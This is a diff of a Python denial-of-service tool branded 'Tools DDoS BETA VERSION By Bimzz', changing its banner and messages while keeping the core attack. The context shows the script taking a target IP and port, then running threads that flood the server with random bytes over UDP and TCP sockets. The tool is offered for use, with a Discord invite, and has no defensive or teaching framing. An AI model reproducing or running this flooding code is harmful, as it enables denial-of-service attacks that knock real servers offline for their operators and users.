@@ -25,11 +25,13 @@ for i in range(3):
 time.sleep(5)
 print("[√] Berhasil Login, Wait")
 time.sleep(5)
-print("------------------------------------------------------------")
-print(" >>   Discord : Bimzz#9999            <<")
-print(" >>   Tools Created By Bimzz x KyTeam <<")
-print(" >>   NOTE : DON'T ABUSE!!            <<")
-print("------------------------------------------------------------")
+print("------------------------------------------------")
+print("[+] Tools DDoS BETA VERSION By Bimzz")
+print("[+] Discord : Bimzz#9999")
+print("[+] YouTube : Bimzz")
+print("[+] Author  : Bimzz x KyTeam")
+print("[+] KyTeam  : https://discord.gg/YMT9utYW5U")
+print("------------------------------------------------")
 ip = str(input(" Bimzz | Ip:"))
 port = int(input(" Bimzz | Port:"))
 choice = str(input(" Bimzz | Ddos Gak?(y/n):"))
@@ -44,9 +46,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"[Bimzz] | Attacking Servers!!")
+			print(i +" | Bimzz Attacking Servers!!")
 		except:
-			print("[!] BIMZZ FUCKING THE SERVER !!! ")
+			print("[!] EROR!! ")
 
 def run2():
 	data = random._urandom(17)
@@ -58,10 +60,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"[Bimzz] | Attacking Servers!!")
+			print(i +" | Bimzz Attacking Servers!!")
 		except:
 			s.close()
-			print("[*] BIMZZ FUCKING THE SERVERS! ")
+			print("[*] EROR!! ")
 
 for y in range(threads):
 	if choice == 'y':
